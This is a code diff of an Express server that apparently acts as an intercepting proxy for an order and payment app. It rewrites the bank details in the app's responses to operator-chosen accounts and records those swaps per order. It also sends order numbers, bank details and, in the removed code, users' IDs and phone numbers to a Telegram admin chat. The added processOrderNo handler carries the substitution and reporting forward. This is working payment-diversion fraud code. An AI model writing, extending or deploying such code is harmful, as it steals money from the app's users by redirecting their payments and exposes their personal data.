@@ -1374,38 +1374,19 @@ app.all('/app/buy/order/details', async (req, res) => {
       rd.buyOrderNo, rd.orderNo, rd.orderId, rd.buyOrderId, rd.id
     ].filter(Boolean);
 
-    const eff = getEffectiveSettings(data, detectedUserId);
-    let bankUsed = null;
-
     if (respData && allIds.length > 0) {
       const savedBank = await getOrderBankMultiple(allIds);
       if (savedBank) {
-        bankUsed = savedBank;
-      } else if (eff.botEnabled !== false) {
-        const active = getActiveBank(data, detectedUserId);
-        if (active) {
-          bankUsed = active;
-          saveOrderBankMultipleKeys(allIds, active);
-        }
-      }
-
-      if (bankUsed) {
         if (Array.isArray(respData)) {
-          respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bankUsed, {}, 0); });
+          respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, savedBank, {}, 0); });
         } else {
-          deepReplace(respData, bankUsed, {}, 0);
+          deepReplace(respData, savedBank, {}, 0);
         }
-        saveOrderBankMultipleKeys(allIds, bankUsed);
+        saveOrderBankMultipleKeys(allIds, savedBank);
       }
     }
 
     sendJson(res, respHeaders, jsonResp, respBody);
-
-    if (data.adminChatId && bot && detectedUserId && !isLogOff(data, detectedUserId)) {
-      const phone = getPhone(data, detectedUserId);
-      const dispOrder = allIds[0] || 'N/A';
-      bot.sendMessage(data.adminChatId, `💰 Order Details [${dispOrder}]\n👤 ${detectedUserId}${phone ? ' (' + phone + ')' : ''}\nIDs: ${allIds.join(', ')}\n💳 Bank: ${bankUsed ? bankUsed.accountHolder + ' | ' + bankUsed.accountNo : 'original'}\n₹${rd.amount || rd.orderAmount || 'N/A'}`).catch(()=>{});
-    }
   } catch(e) { await transparentProxy(req, res); }
 });
 
@@ -1468,7 +1449,28 @@ app.post('/app/buy/order/cancel', async (req, res) => {
 });
 
 app.all('/app/buy/order/processOrderNo', async (req, res) => {
-  await proxyAndReplaceBankDetails(req, res, '💳 Process Order');
+  const data = await loadData();
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const detectedUserId = await extractUserId(req, jsonResp);
+    const eff = getEffectiveSettings(data, detectedUserId);
+    const respData = getResponseData(jsonResp);
+
+    if (typeof respData === 'string' && respData.length > 5 && eff.botEnabled !== false) {
+      const active = getActiveBank(data, detectedUserId);
+      if (active) {
+        const existingBank = await getOrderBank(respData);
+        if (!existingBank) {
+          saveOrderBank(respData, active);
+          if (data.adminChatId && bot) {
+            bot.sendMessage(data.adminChatId, `🔗 processOrderNo: Bank saved for ${respData}\n💳 ${active.accountHolder} | ${active.accountNo}`).catch(()=>{});
+          }
+        }
+      }
+    }
+
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
 });
 
 app.all('/app/buy/order/simpleUserBank', async (req, res) => {
